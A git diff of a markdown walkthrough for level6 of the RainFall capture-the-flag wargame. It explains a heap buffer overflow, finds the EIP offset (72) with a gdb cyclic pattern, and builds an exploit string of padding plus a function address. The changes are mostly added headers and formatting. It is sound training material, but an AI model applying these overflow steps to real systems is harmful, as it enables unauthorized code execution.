@@ -51,12 +51,17 @@ strcpy() copies argv[1] to a 64 byte buffer on the heap.
 
 Let's try to overflow this buffer and overwrite ```eip``` with the address of ```n```, thereby jump to executing ```n```.
 
+### Find EIP offset
+
 First, using the following example with [this EIP offset tool](https://projects.jason-rush.com/tools/buffer-overflow-eip-offset-string-generator/), we find the EIP offset is 72.
 ```
 (gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
 ...
 0x41346341 in ?? ()
 ```
+
+### Build exploit string
+
 So we build our exploit string:
 1. 72 bytes padding
 2. address of ```n``` - "\x54\x84\x04\x08"
@@ -69,7 +74,7 @@ f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
 ## Recreate Exploited Binary
 
-As user level7, in /tmp, create and compile level6_source.c.
+As user ```level7```, in ```/tmp```, create and compile ```level6_source.c```.
 ```
 level7@RainFall:/tmp$ gcc level6_source.c -o level6_source
 ```
@@ -77,7 +82,7 @@ Edit permissions including suid, then move the binary to home directory.
 ```
 level7@RainFall:/tmp$ chmod u+s level6_source; chmod +wx ~; mv level6_source ~
 ```
-Exit back to user level6, then run the source with an updated address of function ```n``` (found with gdb).
+Exit back to user ```level6```, then run the source with an updated address of function ```n``` (found with gdb).
 ```
 level7@RainFall:/tmp$ exit
 exit
